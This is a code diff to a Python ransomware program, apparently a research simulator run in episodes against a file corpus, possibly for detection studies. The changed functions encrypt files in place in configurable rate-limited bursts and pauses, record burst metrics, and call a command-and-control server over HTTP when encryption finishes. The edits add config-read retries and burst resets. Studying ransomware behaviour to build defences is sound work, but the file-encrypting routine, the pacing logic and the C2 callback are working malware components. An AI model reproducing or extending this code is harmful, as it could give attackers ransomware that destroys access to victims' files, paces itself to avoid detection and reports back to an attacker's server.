@@ -126,7 +126,7 @@ def discover_files(start_path):
 
 def write_burst_metrics_to_file(total_files, burst_files, total_size, burst_size, total_duration, config_duration,
                                 burst_duration, pause, config_rate, current_rate, algorithm):
-    print("reporting", total_files, burst_files, total_size, burst_size, total_duration, burst_duration)
+    print("reporting", total_files, burst_files, total_size, burst_size, total_duration, burst_duration, current_rate)
     file_path = path.join(path.abspath(path.curdir), "metrics.txt")
     if not path.exists(file_path):
         with open(file_path, "x") as file:
@@ -159,6 +159,9 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
 
     :return: burst_files, burst_size, and burst_start for current burst at time of return.
     """
+    config = get_config_from_file()
+    old_cfg_duration = config["BURST"]["duration"]
+
     with open(file_name, 'r+b') as f:
         plaintext = f.read(block_size)  # read number of bytes
 
@@ -167,6 +170,7 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
             # RESET CORPUS WHEN EPISODE IS TERMINATED
             # ==============================
 
+            # print("encrypting file", plaintext)
             if path.exists(get_reset_path()) or path.exists(get_terminate_path()):
                 subprocess.call('echo "0" > ./{}'.format(RATE_FILE), shell=True)
                 break
@@ -175,11 +179,36 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
             # GET LATEST CONFIG
             # ==============================
 
-            config = get_config_from_file()
-            cfg_rate = float(config["GENERAL"]["rate"])  # bytes per second
-            cfg_pause = int(config["BURST"]["pause"])  # seconds
-            cfg_duration = int(config["BURST"]["duration"][1:])  # format examples "s5" or "f30"
-            limit_files = config["BURST"]["duration"].startswith("f")
+            # FIXME: solve race condition by properly implementing file lock;
+            #  Currently, concurrent read and write operations sometimes lead to key errors
+            #  Solved as of now by just re-reading the file
+            max_retries = 3
+            for i in range(max_retries):  # retry concurrent read at most 3 time
+                success = False
+                try:
+                    config = get_config_from_file()
+                    cfg_rate = float(config["GENERAL"]["rate"])  # bytes per second
+                    cfg_pause = int(config["BURST"]["pause"])  # seconds
+                    new_cfg_duration = config["BURST"]["duration"]
+                    cfg_duration = int(config["BURST"]["duration"][1:])  # format examples "s5" or "f30"
+                    limit_files = config["BURST"]["duration"].startswith("f")
+                    success = True
+                except Exception as e:
+                    print("ERROR GETTING CONFIG, RETRYING", i+1, "; ERROR", e)
+                    if i >= max_retries:
+                        raise e
+                if success:
+                    break
+
+            if old_cfg_duration != new_cfg_duration:
+                old_cfg_duration = new_cfg_duration
+                timer = 1  # seconds
+                # print("resetting burst for new duration config, sleeping for", timer)
+                sleep(timer)
+                # reset burst to avoid dramatic sleep periods for rate limitation
+                burst_files = 0
+                burst_size = 0
+                burst_start = time()
 
             # ==============================
             # ENCRYPT
@@ -225,7 +254,7 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
                                                     "%.3f" % burst_duration, cfg_pause, cfg_rate,
                                                     "%.3f" % (burst_size / burst_duration), config["GENERAL"]["algo"])
 
-                        # print("sleeping for", cfg_pause)
+                        # print("burst pause (rate) sleeping for", cfg_pause)
                         sleep(cfg_pause)
 
                         burst_files = 0
@@ -252,6 +281,7 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
 
             plaintext = f.read(block_size)
 
+    # print("done encrypting file")
     return total_size, burst_files, burst_size, burst_start, metric_time
 
 
@@ -396,7 +426,7 @@ def encrypt_files(key, start_dirs):
                                                         cfg_duration, "%.3f" % burst_duration, cfg_pause, cfg_rate,
                                                         "%.3f" % (b_size / burst_duration), config["GENERAL"]["algo"])
 
-                            # print("sleeping for", cfg_pause)
+                            # print("burst pause (file) sleeping for", cfg_pause)
                             sleep(cfg_pause)
 
                             all_reported = True  # when final file and file limit
@@ -449,7 +479,7 @@ def decrypt_files(key, start_dirs):
 
 
 def notify_rw_done():
-    # print("RW done")
+    print("RW done")
     put(url="http://{}:{}{}".format(C2_IP, C2_PORT, C2_RW_ROUTE), data="")
 
 
